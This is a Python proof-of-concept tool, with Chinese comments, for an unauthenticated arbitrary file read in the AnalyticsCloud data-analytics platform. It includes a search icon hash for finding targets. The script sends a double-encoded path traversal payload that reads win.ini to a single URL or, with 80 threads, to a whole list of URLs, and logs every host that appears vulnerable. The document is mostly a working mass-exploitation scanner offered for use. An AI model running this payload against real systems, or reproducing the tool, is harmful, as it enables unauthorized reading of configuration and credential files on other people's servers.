# AnalyticsCloud 分析云 任意文件读取漏洞
# icon_hash="888607769"
# 产品简介: AnalyticsCloud 分析云集成了先进的数据分析技术和工具，能够处理来自各种数据源的数据，包括云数据、本地数据、传统数据和大数据等。它提供了从数据收集、整理、分析到应用的全链路解决方案，帮助企业更好地理解和利用数据，从而优化业务流程、提升决策效率。
# 漏洞概述:AnalyticsCloud 分析云 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
\x1b[38m █████╗  ██████╗        ███████╗██╗██╗     ███████╗██████╗ ███████╗ █████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
\x1b[36m██╔══██╗██╔════╝        ██╔════╝██║██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
\x1b[34m███████║██║             █████╗  ██║██║     █████╗  ██████╔╝█████╗  ███████║██║  ██║██║██╔██╗ ██║██║  ███╗
\x1b[35m██╔══██║██║             ██╔══╝  ██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
\x1b[31m██║  ██║╚██████╗███████╗██║     ██║███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
\x1b[33m╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝                                                
                                                            --author:Kucei
                                                                --Vession:AnalyticsCloud_分析云-FileReading                                                                                                             
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("AnalyticsCloud_分析云-FileReading")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = "/.%252e/.%252e/c:/windows/win.ini"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive',
    }
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        if response.status_code == 200 and 'support' in response.text:
            print( f"[+] {target} 存在漏洞")
            with open('AnalyticsCloud_分析云-FileReading.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")

if __name__ == '__main__':
    main()